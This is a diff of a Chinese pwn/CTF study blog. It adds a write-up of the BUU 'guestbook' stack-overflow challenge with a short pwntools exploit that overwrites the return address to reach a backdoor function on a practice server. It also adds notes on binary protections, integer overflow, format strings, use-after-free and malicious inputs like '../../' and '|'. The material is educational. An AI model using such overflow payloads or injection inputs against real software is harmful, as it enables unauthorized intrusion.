@@ -93,7 +93,23 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        
+        <p>首先：必须要有一个漏洞点 ，溢出(长度溢出，类型变化)，条件竞争等</p>
+<p>然后根据这个漏洞点，能修改到哪些东西，并进一步进行利用，最后拿到程序控制权。</p>
+<p>​        比如：栈溢出，溢出能修改返回地址，那么直接拿到程序控制权。</p>
+<p>​                    栈溢出，溢出修改其他字符串/地址/值 ，进一步查看其他字符串和地址和值的使用。</p>
+<p>​                    堆溢出，溢出修改chunk 头，修改下一次申请 chunk 地址</p>
+<p>下面用实战证明</p>
+<p>​        buu guestbook</p>
+<p>​        <img src="/.com//image-20220118184447579.png" alt="image-20220118184447579"></p>
+<p>然后ida 一键F5 问就是懒</p>
+<p><img src="/.com//image-20220118184547127.png" alt="image-20220118184547127"></p>
+<p>明显一个栈溢出，没有canary ， 然后找找有无后门函数 </p>
+<p>好像有个good_game() 函数，行了直接写exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">ip = &quot;node4.buuoj.cn&quot;</span><br><span class="line">port = 27755</span><br><span class="line"></span><br><span class="line">return_add = 0x400620</span><br><span class="line"></span><br><span class="line">io = remote(ip,port)</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27; * 0x88 +   p64(return_add).decode(&quot;iso-8859-1&quot;)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
       
     </div>
     <footer class="article-footer">
@@ -134,7 +150,7 @@
         <p>上一篇零零散散的写了一些内容，这一篇还是零零散散写一些内容</p>
 <p>主要是基础知识简单介绍</p>
 <h3 id="常见保护措施"><a href="#常见保护措施" class="headerlink" title="常见保护措施"></a>常见保护措施</h3><p>用checksec就能直接看出来存在哪些保护措施</p>
-<p><img src="/.com//image-20220117201718610.png"></p>
+<p><img src="/.com//1.png"></p>
 <p>RELRO： RELocation Read-Only 针对 got 表的，简单理解为 call [so函数], 将该位置设置为不可写 。防止 got表劫持</p>
 <p>Canary:   在函数返回值之前放置 fs:[0x28] 的值，函数返回时校验该值，静态插桩实现。 减少栈溢出</p>
 <p>NX：Not eXecute 简单理解为 数据段不可执行，防止 shellcode。</p>
@@ -231,13 +247,15 @@
 <h6 id="整形越界"><a href="#整形越界" class="headerlink" title="整形越界"></a>整形越界</h6><p>除了字符越界，别忘了还有整形，形如int , short , char 。整形越界又分两种。</p>
 <p>补码形如一个圆圈</p>
 <p>有符号情况下如下图所示，需要考虑 最大正数+1 &lt; 0 的情况</p>
-<p><img src="pwn1.png" alt="pwn1"></p>
+<p><img src="/.com//pwn1.png" alt="pwn1"></p>
 <p>无符号则要考虑另一个情况， 最大正数+1 == 0 的情况(文章同样还没写)</p>
-<p><img src="pwn2.png" alt="pwn2"></p>
+<p><img src="/.com//pwn2.png" alt="pwn2"></p>
 <h6 id="类型混淆"><a href="#类型混淆" class="headerlink" title="类型混淆"></a>类型混淆</h6><p>勉强也算在越界里吧，浮点数的0 不是 整形的0 。但是计算机可不记得它是什么类型 ，都是4 byte 。浮点数大致是 符号位 + 小数位 + 指数位。那么 浮点数(如 负0） 如果变成无符号整形就会变成一个很大的数。可能导致奇特的逻辑，从而被劫持控制流(同样未写)</p>
 <h6 id="不定参数函数-参数越界"><a href="#不定参数函数-参数越界" class="headerlink" title="不定参数函数(参数越界)"></a>不定参数函数(参数越界)</h6><p>确切来说应该叫格式化字符串漏洞。成因算是不定参数导致的。因为不确定参数的数量，一般会使用第一个参数作为参数数量的确定。之后具体分析吧，写过，但文章丢了。</p>
 <h5 id="条件竞争问题"><a href="#条件竞争问题" class="headerlink" title="条件竞争问题"></a>条件竞争问题</h5><p>一块空间，两个线程，都有写的权限。这个可以参照脏牛漏洞。</p>
 <p>虽然逻辑有点乱，毕竟水平有限。下一篇写一点常见的 程序自我保护 和 解决方案。</p>
+<h5 id="开发者逻辑错误"><a href="#开发者逻辑错误" class="headerlink" title="开发者逻辑错误"></a>开发者逻辑错误</h5><p>​    use after free : free 后未置零 ， 堆的fastbin 等</p>
+<p>​    未考虑恶意输入： ../../ ，| 命令连接符等</p>
 
       
     </div>
